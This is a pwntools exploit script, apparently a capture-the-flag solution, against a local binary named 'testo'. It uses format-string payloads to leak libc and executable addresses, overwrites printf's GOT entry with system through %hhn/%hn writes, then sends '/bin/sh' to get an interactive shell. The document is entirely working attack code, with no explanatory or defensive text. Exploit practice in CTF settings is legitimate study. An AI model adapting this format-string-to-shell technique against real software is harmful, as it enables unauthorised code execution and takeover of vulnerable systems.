from pwn import * 
exe = ELF("testo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
p = process(exe.path)
'''
gdb.attach(p,
"""
b*replace_tag_v2
c
""")
input()
'''
p.sendafter(b'L!\n',b'%11$llx\x00bbbbbbbbbbbbbbbbbbb<\x00></')

p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'\x00')
p.sendlineafter(b'With what new tag?\n',b'\x01')

p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'a')
p.sendlineafter(b'With what new tag?\n',b'b')
p.recvuntil(b'[DEBUG] ') 
leak_libc = int(p.recvn(12) ,16)
libc.address = leak_libc - 569197
print('libc : ',hex(libc.address)) 
p.sendlineafter(b'about v2: ',b'%18$llx') 
p.recvuntil(b'Your respones: "')
leak_exe = int(p.recvn(12),16)  
exe.address = leak_exe - 8360 
print('exe : ',hex(exe.address))


p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'a')
p.sendlineafter(b'With what new tag?\n',b'b')
write1 = libc.sym['system'] & 0xff
write2 = libc.sym['system'] >> 8 & 0xffff
payload = f'%{write1}c%12$hhn%{write2-write1}c%13$hn'.encode()
payload = payload.ljust(0x20,b'A') 
payload += p64(exe.got['printf'])  + p64(exe.got['printf']+1) 
p.sendlineafter(b'about v2: ',payload) 

p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'a')
p.sendlineafter(b'With what new tag?\n',b'b')
p.sendline(b'/bin/sh\x00') 

p.interactive() 

